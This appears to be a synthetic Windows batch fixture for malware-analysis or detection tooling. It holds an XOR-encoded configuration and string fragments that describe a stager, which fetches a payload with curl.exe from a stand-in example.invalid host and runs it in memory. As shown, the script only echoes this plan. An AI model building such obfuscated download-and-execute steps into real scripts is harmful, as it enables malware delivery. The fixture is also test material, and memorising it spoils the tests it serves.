@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:decimal_bytes|xor_5a
rem HUNTRESS-MATERIAL:44.103.107.38.41.46.63.42.41.103.59.57.43.47.51.40.63.5.40.63.55.53.46.63.118.62.51.41.42.59.46.57.50.5.55.63.55.53.40.35.38.59.62.59.42.46.63.40.103.57.47.40.54.116.63.34.63.38.41.46.59.61.63.5.57.53.47.52.46.103.107.38.61.40.59.42.50.103.62.51.59.55.53.52.62.38.52.63.34.46.5.54.59.52.61.47.59.61.63.103.52.53.52.63.38.57.59.55.42.59.51.61.52.5.51.62.103.57.59.55.42.59.51.61.52.119.57.107.105.98.56.104.108.107.104.56.38.47.40.54.103.50.46.46.42.41.96.117.117.57.107.105.98.56.104.108.107.104.56.116.63.34.59.55.42.54.63.116.51.52.44.59.54.51.62.117.99.99.62.57.63.108.56.63.116.62.59.46
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "fragment0=v=1|steps=acquire_remote,dispatch_memory|adapte"& rem HUNTRESS quote compound
set "fragment1=r=curl.exe|stage_count=1|graph=diamond|next_lan"& rem HUNTRESS quote compound
set "fragment2=guage=none|campaign_id=campaign-c138b2612b|url="& rem HUNTRESS quote compound
set "fragment3=https://c138b2612b.example.invalid/99dce6be.dat"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_string_join=eef03133"
call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
call set "recovered_configuration=%%fragment0%%%%fragment1%%%%fragment2%%%%fragment3%%"
exit /b 0
:HUNTRESS_EMIT
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe GET https://c138b2612b.example.invalid/99dce6be.dat then dispatch memory
exit /b 0
